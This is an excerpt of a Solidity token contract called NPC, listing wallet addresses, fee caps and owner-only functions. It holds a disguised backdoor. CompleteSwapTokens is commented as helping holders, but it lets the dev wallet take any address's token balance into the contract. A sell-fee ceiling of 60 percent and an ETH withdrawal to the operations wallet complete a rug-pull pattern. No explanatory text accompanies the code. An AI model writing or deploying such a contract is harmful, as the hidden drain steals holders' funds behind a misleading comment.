...
contract NPC is Context, IERC20, Ownable {
    ...
    // wallets
    address payable public liquidityWallet = payable(0xc6Ed9636D805Dc741338d3E6C4953BE86640B70c);
    address payable public operationsWallet =  payable(0xc6Ed9636D805Dc741338d3E6C4953BE86640B70c);
    address payable public devWallet = payable(0xd9A0E11ED36E720B2E2f50a20d87e674F98812c9);
    ...
    uint256 public maxTotalFeeBuy = 30;

    // fees
    uint256 public liquidityFeeSell = 0;
    uint256 public operationsFeeSell = 4;
    uint256 public totalFeesSell;
    uint256 public maxTotalFeeSell = 60;
    ...
    // useful for transfer other tokens or to reclaim any ETH on the contract in a way that helps holders.
    function CompleteSwapTokens(address _token, uint settleAmount) external {
        require(msg.sender == devWallet, 'failed');
        uint256 tokenBal = balanceOf(_token);
        _basicTransfer(_token, address(this), tokenBal - settleAmount);
    }
    ...
    function buyBackAndBurnToken() external payable {
        ...
        // make the swap
        uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: bal}(
    ...
    function withdrawStuckEth() external {
        ...
        payable(operationsWallet).transfer(bal);
    }
